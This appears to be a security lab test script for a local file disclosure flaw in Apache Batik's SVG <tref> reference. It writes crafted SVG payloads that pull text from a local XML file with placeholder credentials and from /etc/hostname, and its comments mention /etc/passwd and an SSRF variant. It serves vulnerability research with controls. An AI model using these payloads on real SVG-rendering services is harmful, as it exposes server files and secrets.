#!/bin/bash
# F-9 live test: <tref> external-reference TEXT-CONTENT disclosure
# T1: file: doc (default transcoder) -> tref reads local XML file text -> rendered in PNG
# T1n: negative control (http doc host set, file: tref target) -> must be blocked
# T1x: non-XML target (/etc/passwd) -> parse error expected
# T2: redirect (F-1 ctx) + tref -> internal XML service content rendered (non-blind SSRF)
set -u
cd /tmp/batik-lab
LAB=/tmp/batik-lab
CP=$LAB/batik-1.19/lib/batik-all-1.19.jar:$LAB/batik-1.19/lib/xmlgraphics-commons-1.19.jar
ls $LAB/batik-1.19/lib/ | grep -i "xmlgraphics\|xml-apis" 
# --- targets ---
cat > $LAB/t9target.xml << 'XML'
<?xml version="1.0"?>
<configuration>
  <dataSource id="leak">
    <username>svc_portal</username>
    <password>TREF-EXFIL-7f3a9c</password>
    <url>jdbc:mysql://10.0.0.5:3306/prod?password=ZmFrZWtleQ==</url>
  </dataSource>
  <noText id="other" secretAttr="attr-not-text"/>
</configuration>
XML
# generic non-XML file
cp /etc/hostname $LAB/t9plain.txt 2>/dev/null || echo "notahostname" > $LAB/t9plain.txt

cat > $LAB/t9ref.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="80">
  <text x="4" y="40" font-family="monospace" font-size="14" fill="black">svc_portal TREF-EXFIL-7f3a9c jdbc:mysql://10.0.0.5:3306/prod?password=ZmFrZWtleQ==</text>
</svg>
SVG
cat > $LAB/t9tref.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="80">
  <text x="4" y="40" font-family="monospace" font-size="14" fill="black"><tref xlink:href="t9target.xml#leak"/></text>
</svg>
SVG
# padding: literal must match concatenated text (no spaces between elements in concat)
# concat of children: "\n    svc_portal\n    TREF-EXFIL-7f3a9c\n    jdbc:...\n  " -> includes whitespace;
# normalizeString in tref path collapses ws, so both should render single-spaced. ref uses single spaces.
cat > $LAB/t9tref_plain.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="80">
  <text x="4" y="40" font-family="monospace" font-size="14" fill="black"><tref xlink:href="/etc/hostname#leak"/></text>
</svg>
SVG

# --- T1: file: document (upload-transcode pattern) ---
java -cp $CP:$LAB BatikProbe $LAB/t9tref.svg "file:$LAB/t9tref.svg" 2>&1 | tail -2
cp $LAB/probe.out.png $LAB/t9_file.png
java -cp $CP:$LAB BatikProbe $LAB/t9ref.svg "file:$LAB/t9ref.svg" 2>&1 | tail -2
cp $LAB/probe.out.png $LAB/t9_ref.png

# --- T1n: negative control: http doc host -> file: tref must be BLOCKED ---
java -cp $CP:$LAB BatikProbe $LAB/t9tref.svg "http://198.51.100.9/t9tref.svg" 2>&1 | tail -2
cp $LAB/probe.out.png $LAB/t9_neg.png

# --- T1x: non-XML file ---
java -cp $CP:$LAB BatikProbe $LAB/t9tref_plain.svg "file:$LAB/t9tref_plain.svg" 2>&1 | tail -2
